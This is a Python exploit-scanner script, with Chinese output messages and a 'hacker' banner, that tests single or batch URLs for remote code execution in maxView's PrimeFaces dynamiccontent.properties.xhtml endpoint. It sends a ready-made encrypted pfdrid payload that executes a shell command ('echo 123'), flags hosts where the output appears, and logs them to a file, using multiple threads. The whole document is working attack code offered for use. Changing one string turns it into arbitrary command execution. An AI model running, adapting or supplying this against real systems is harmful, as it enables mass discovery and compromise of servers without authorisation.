import requests
import threading
from queue import Queue
import argparse

# Queue for holding URLs to check
url_queue = Queue()

def check_rce(url):
    # Construct the vulnerable URL
    vuln_url = url.rstrip('/') + "/maxview/manager/javax.faces.resource/dynamiccontent.properties.xhtml"
    payload = "echo 123"

    # Use a simplified payload to minimize issues with encoding
    data = f"pfdrt=sc&ln=primefaces&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D&cmd={{{payload}}}"

    headers = {
        "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        response = requests.post(vuln_url, headers=headers, data=data, timeout=5, verify=False)

        # Check for successful response and presence of payload in response text
        if response.status_code == 200 and '123' in response.text:
            print(f"[+] 目标网址存在漏洞: {url}")
            with open("vuln_urls.txt", "a") as f:
                f.write(url + "\n")
        else:
            print(f"[-] 目标网址不存在漏洞: {url}")

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] 无法连接到目标网址 {url}: {str}")


def worker():
    while not url_queue.empty():
        url = url_queue.get()
        check_rce(url)
        url_queue.task_done()

def banner():
    info = '''
                                                                                                                 
                                                                                                                 
hhhhhhh                                                  kkkkkkkk                                                
h:::::h                                                  k::::::k                                                
h:::::h                                                  k::::::k                                                
h:::::h                                                  k::::::k                                                
 h::::h hhhhh         aaaaaaaaaaaaa      cccccccccccccccc k:::::k    kkkkkkk eeeeeeeeeeee    rrrrr   rrrrrrrrr   
 h::::hh:::::hhh      a::::::::::::a   cc:::::::::::::::c k:::::k   k:::::kee::::::::::::ee  r::::rrr:::::::::r  
 h::::::::::::::hh    aaaaaaaaa:::::a c:::::::::::::::::c k:::::k  k:::::ke::::::eeeee:::::eer:::::::::::::::::r 
 h:::::::hhh::::::h            a::::ac:::::::cccccc:::::c k:::::k k:::::ke::::::e     e:::::err::::::rrrrr::::::r
 h::::::h   h::::::h    aaaaaaa:::::ac::::::c     ccccccc k::::::k:::::k e:::::::eeeee::::::e r:::::r     r:::::r
 h:::::h     h:::::h  aa::::::::::::ac:::::c              k:::::::::::k  e:::::::::::::::::e  r:::::r     rrrrrrr
 h:::::h     h:::::h a::::aaaa::::::ac:::::c              k:::::::::::k  e::::::eeeeeeeeeee   r:::::r            
 h:::::h     h:::::ha::::a    a:::::ac::::::c     ccccccc k::::::k:::::k e:::::::e            r:::::r            
 h:::::h     h:::::ha::::a    a:::::ac:::::::cccccc:::::ck::::::k k:::::ke::::::::e           r:::::r            
 h:::::h     h:::::ha:::::aaaa::::::a c:::::::::::::::::ck::::::k  k:::::ke::::::::eeeeeeee   r:::::r            
 h:::::h     h:::::h a::::::::::aa:::a cc:::::::::::::::ck::::::k   k:::::kee:::::::::::::e   r:::::r            
 hhhhhhh     hhhhhhh  aaaaaaaaaa  aaaa   cccccccccccccccckkkkkkkk    kkkkkkk eeeeeeeeeeeeee   rrrrrrr            
                                                                                                    

'''
    print(info)
    print('-u http://www.xxx.com 进行单个漏洞检测')
    print('-f targetUrl.txt 对选中文档中的网址进行批量检测')
    print('--help 查看更多详细帮助信息')


def main():
    parser = argparse.ArgumentParser(description="maxView 系统 dynamiccontent.properties.xhtml 远程代码执行漏洞")

    parser.add_argument('-u', '--url', type=str, help='单个url检测')
    parser.add_argument('-f', '--file', type=str, help='从文件中批量检测')
    parser.add_argument('-t', '--threads', type=int, default=10, help='更改线程使检测速度加快 （默认为：10）')

    args = parser.parse_args()

    if args.url:
        url_queue.put(args.url)
    elif args.file:
        try:
            with open(args.file, "r") as file:
                urls = file.readlines()
                for url in urls:
                    url_queue.put(url.strip())
        except Exception as e:
            print(f"[ERROR] 无法读取文件: {str}")
            return

    num_threads = args.threads
    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        thread.daemon = True
        thread.start()

    url_queue.join()


if __name__ == "__main__":
    banner()
    main()
